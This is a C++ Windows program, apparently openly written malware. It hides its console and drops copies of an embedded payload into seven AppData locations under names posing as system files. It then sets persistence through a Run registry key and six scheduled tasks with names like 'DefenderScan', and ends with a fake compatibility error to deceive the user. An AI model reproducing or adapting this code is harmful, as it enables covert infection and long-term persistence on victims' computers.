#include<iostream>
#include<windows.h>
#include<fstream>
#include <locale>
#include <codecvt>
#include"embedexe_data.h"
#include<filesystem>
#include<cstdio>
namespace fs =std::filesystem;

//get current logged user name function
std::string getUserName(){
    char user[256];
    DWORD size = sizeof(user);
    GetUserNameA(user,&size);
    return std::string(user);
}
// convert std::string to wide string function
std::wstring stringToWstring(const std::string& str) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.from_bytes(str);
}
// Delete 7Hooks after execution is finished


int main(){
    //Hide Console
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
//Target Directories (7Hooks) as Array
    std::string directories[]={
    "C:\\Users\\"+getUserName()+"\\AppData\\Local\\Temp\\FileManager.exe",
    "C:\\Users\\"+getUserName()+"\\AppData\\Local\\VirtualStore\\SVCHOST_NTS.exe",
    "C:\\Users\\"+getUserName()+"\\AppData\\Roaming\\Microsoft\\UserPrefrences.exe",
    "C:\\Users\\"+getUserName()+"\\AppData\\Roaming\\Microsoft\\Protect\\Alliance_x64.exe",
    "C:\\Users\\"+getUserName()+"\\AppData\\Roaming\\Microsoft\\Windows\\System32.exe",
    "C:\\Users\\"+getUserName()+"\\AppData\\LocalLow\\ServicePackV12.3.exe",
    "C:\\Users\\"+getUserName()+"\\AppData\\Roaming\\Microsoft\\SecurityPatcher_x64.exe"};
//Iteration Target Directories
    for(const auto& dir : directories){
    std::ofstream outFile(dir,std::ios::binary);
//Inject a copy of malware in current directory
    outFile.write(reinterpret_cast<const char*>(embedexe_data),sizeof(embedexe_data));
//Close current directory
    outFile.close();
    }
//RegistryPersistance

    HKEY hKey;
    LPCSTR subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::wstring executablePth1 = stringToWstring(directories[0]);
    const wchar_t* executablePath1 = executablePth1.c_str();
    LPCWSTR valueName1 = L"System32";

    // Open the registry key
    if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        size_t pathLength1 = wcslen(executablePath1);
        // Set the registry value to point to the executable path
        if (RegSetValueExW(hKey, valueName1, 0, REG_SZ, reinterpret_cast<const BYTE*>(executablePath1), (pathLength1 + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
        }
        RegCloseKey(hKey);
    }

    //Schedual other rest 6 hooks.
    LPCWSTR taskName1 = L"SystemTasksx64";
    LPCWSTR taskName2 = L"CoreOsTask";
    LPCWSTR taskName3 = L"DefenderScan";
    LPCWSTR taskName4 = L"WanController";
    LPCWSTR taskName5 = L"System64";
    LPCWSTR taskName6 = L"System86";

    std::wstring exePth1 = stringToWstring(directories[1]);
    const wchar_t* exePath1 = exePth1.c_str();
    std::wstring exePth2 = stringToWstring(directories[2]);
    const wchar_t* exePath2 = exePth2.c_str();
    std::wstring exePth3 = stringToWstring(directories[4]);
    const wchar_t* exePath3 = exePth3.c_str();
    std::wstring exePth4 = stringToWstring(directories[6]);
    const wchar_t* exePath4 = exePth4.c_str();
    std::wstring exePth5 = stringToWstring(directories[3]);
    const wchar_t* exePath5 = exePth5.c_str();
    std::wstring exePth6 = stringToWstring(directories[5]);
    const wchar_t* exePath6= exePth6.c_str();

    wchar_t command1[256];
    swprintf_s(command1, L"schtasks /delete /tn \"%s\" /f", taskName1);
    wchar_t command1a[256];
    swprintf_s(command1a, L"schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 1", taskName1, exePath1);

    wchar_t command2[256];
    swprintf_s(command2, L"schtasks /delete /tn \"%s\" /f", taskName2);
    wchar_t command2a[256];
    swprintf_s(command2a, L"schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5", taskName2, exePath2);

    wchar_t command3[256];
    swprintf_s(command3, L"schtasks /delete /tn \"%s\" /f", taskName3);
    wchar_t command3a[256];
    swprintf_s(command3a, L"schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 30", taskName3, exePath3);

    wchar_t command4[256];
    swprintf_s(command4, L"schtasks /delete /tn \"%s\" /f", taskName4);
    wchar_t command4a[256];
    swprintf_s(command4a, L"schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 40", taskName4, exePath4);

    wchar_t command5[256];
    swprintf_s(command5, L"schtasks /delete /tn \"%s\" /f", taskName5);
    wchar_t command5a[256];
    swprintf_s(command5a, L"schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 50", taskName5, exePath5);

    wchar_t command6[256];
    swprintf_s(command6, L"schtasks /delete /tn \"%s\" /f", taskName6);
    wchar_t command6a[256];
    swprintf_s(command6a, L"schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 59", taskName6, exePath6);
   
    _wsystem(command1);
    _wsystem(command1a);
    _wsystem(command2);
    _wsystem(command2a);
    _wsystem(command3);
    _wsystem(command3a);
    _wsystem(command4);
    _wsystem(command4a);
    _wsystem(command5);
    _wsystem(command5a);
    _wsystem(command6);
    _wsystem(command6a);

MessageBox(NULL,"Error:Software is not compatible with your system, Please contact the publisher to get a compatible version.","ErrCode_E781a",MB_ICONERROR|MB_OK);
return 0;
}

